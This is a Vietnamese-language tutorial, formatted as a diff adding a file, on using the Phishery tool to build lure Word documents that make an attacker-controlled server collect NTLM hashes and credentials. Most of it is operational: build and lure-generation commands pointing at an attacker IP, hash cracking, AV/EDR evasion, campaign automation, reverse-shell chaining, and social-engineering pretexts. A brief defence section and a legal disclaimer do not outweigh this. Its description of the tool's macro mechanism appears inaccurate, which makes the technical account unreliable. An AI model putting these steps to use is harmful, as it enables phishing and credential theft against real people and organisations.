@@ -1,0 +1,155 @@
+1. Phishery là gì?
+
+    Phishery là một công cụ mã nguồn mở giúp tự động chèn mã độc (phishing macro) vào file Microsoft Word (docx) để thực hiện tấn công phishing qua tài liệu văn bản.
+
+    Khi nạn nhân mở file và cho phép macro chạy, tài liệu sẽ tải dữ liệu từ remote server (web server của attacker) – thường là lấy credentials hoặc thực hiện các hành vi tấn công khác (dump NTLM hash, lấy token, chạy payload...).
+
+    Phishery được biết đến nhiều vì bypass tốt các bộ lọc email và các hệ thống AV/EDR căn bản.
+
+2. Nguyên lý hoạt động
+
+    Phishery nhúng macro vào file Word với payload đơn giản: Khi user mở file, macro sẽ thực hiện HTTP request ra ngoài, ví dụ tới server của attacker (qua HTTP hoặc HTTPS).
+
+    Khi nạn nhân truy cập, attacker có thể:
+
+        Thu thập NTLM hash (qua phương thức xác thực của Windows)
+
+        Thu thập token/cookie
+
+        Inject mã độc/tải mã lệnh khác
+
+3. Cài đặt Phishery
+3.1. Yêu cầu
+
+    Go (Golang): vì phishery viết bằng Go
+
+    Máy Windows hoặc Linux đều chạy được (dùng để build file, còn để test nên có máy Windows)
+
+    Tài liệu Word (docx) gốc để inject macro
+
+3.2. Cài đặt
+
+git clone https://github.com/ryhanson/phishery.git
+cd phishery
+go build
+
+Tạo ra file binary phishery hoặc phishery.exe (tùy hệ điều hành).
+4. Sử dụng cơ bản
+4.1. Tạo macro phishing trong file Word
+
+Cú pháp cơ bản:
+
+phishery -i input.docx -o output.docm -u http://yourserver.com/file.txt
+
+    -i: file Word gốc (docx)
+
+    -o: file Word đầu ra (docm, hỗ trợ macro)
+
+    -u: URL payload (điểm đến khi macro chạy, thường là domain/web server bạn kiểm soát)
+
+4.2. Mô tả quá trình
+
+    Tạo file Word gốc (docx) –> inject macro –> thành file docm có macro.
+
+    Khi victim mở file và Enable Content/Macro, file sẽ gọi HTTP request tới server của bạn.
+
+5. Thực chiến: Thu thập NTLM Hash
+5.1. Mở HTTP server hỗ trợ NTLM
+
+Trên máy attacker, dùng Responder, Impacket ntlmrelayx, hoặc phishery built-in server:
+
+Ví dụ với phishery built-in:
+
+phishery-server -c phishery.crt -k phishery.key
+
+(hoặc chỉ cần dùng python simple server nếu chỉ để log request).
+5.2. Chèn macro với URL của server bạn
+
+phishery -i bait.docx -o lure.docm -u http://attackerip/
+
+Gửi lure.docm cho nạn nhân.
+5.3. Khi victim mở file và enable macro
+
+    Office sẽ tự động gửi NTLM authentication (qua web request tới domain attacker).
+
+    Attacker thu thập hash, có thể brute-force (crack) hash này bằng hashcat hoặc John the Ripper để lấy password.
+
+6. Phishery nâng cao
+6.1. Sử dụng HTTPS (tăng độ tin cậy, tránh bị flag)
+
+    Tạo SSL cert, dùng với phishery:
+
+    phishery-server -c phishery.crt -k phishery.key
+
+    Dùng Let's Encrypt, self-signed cert, hoặc mua cert hợp lệ để giảm cảnh báo khi nạn nhân enable macro.
+
+6.2. Thu thập nhiều thông tin hơn
+
+    Có thể chèn các macro nâng cao: gửi cả môi trường hệ thống, máy tính, username, IP,...
+
+    Kết hợp macro với payload Powershell hoặc VBA phức tạp để tăng hiệu quả tấn công (ví dụ tải mã độc về chạy tiếp).
+
+6.3. Bypass detection & AV/EDR
+
+    Dùng macro code “sạch”, tránh key suspicious, obfuscate mã.
+
+    Sử dụng payload nhẹ, chỉ GET request, hoặc dùng server redirect.
+
+    Dùng các domain hợp lệ, tránh dùng IP public trần trụi.
+
+6.4. Kịch bản automation
+
+    Viết script batch tự động generate nhiều file lure khác nhau với URL khác nhau (tùy user, tùy campaign).
+
+    Kết hợp log và alert qua Discord/Telegram/Webhook khi có truy cập mới vào server.
+
+7. Kết hợp với công cụ khác
+
+    Responder, ntlmrelayx: Chuyên bắt NTLM hash và relay.
+
+    Metasploit/Empire: Nếu muốn tiến xa hơn, chèn macro phức tạp để drop payload hoặc reverse shell.
+
+    MacroPack: Hỗ trợ encode/obfuscate macro và pack vào file office (tăng độ stealthy).
+
+8. Mẹo cho pentester/red teamer
+
+    Gửi file lure qua email phishing, USB, upload lên cloud share.
+
+    Tùy biến nội dung file (hợp đồng, báo giá, biên bản...) cho giống thật.
+
+    Có thể kèm hướng dẫn “bấm Enable Content để xem chi tiết hợp đồng”.
+
+    Nếu bị chặn macro, gửi bản “giả PDF” hoặc “protected view” để victim phải mở bằng MS Office native.
+
+9. Chống lại Phishery
+
+    Chỉ mở file Office từ nguồn tin cậy.
+
+    Không bật macro trừ khi chắc chắn an toàn.
+
+    Chặn outbound HTTP/HTTPS từ Office apps trên firewall.
+
+    Dùng EDR có detection macro behavior.
+
+10. Một số lệnh/tùy chọn nâng cao
+
+phishery -h                      # Xem hướng dẫn
+phishery -i doc.docx -o lure.docm -u http://server -n "Prompt string" # Chèn custom prompt
+phishery-server -h               # Server nhận request (NTLM)
+
+11. Lưu ý pháp lý
+
+    Chỉ dùng khi đã được ủy quyền hoặc trong môi trường lab kiểm thử!
+
+    Việc sử dụng Phishery ngoài phạm vi pentest có thể bị truy cứu trách nhiệm hình sự.
+
+12. Tài liệu & Tham khảo
+
+    Phishery Github
+
+    Bài thực chiến: Lấy NTLM hash qua Office macro
+
+    MacroPack
+
+    Responder
+
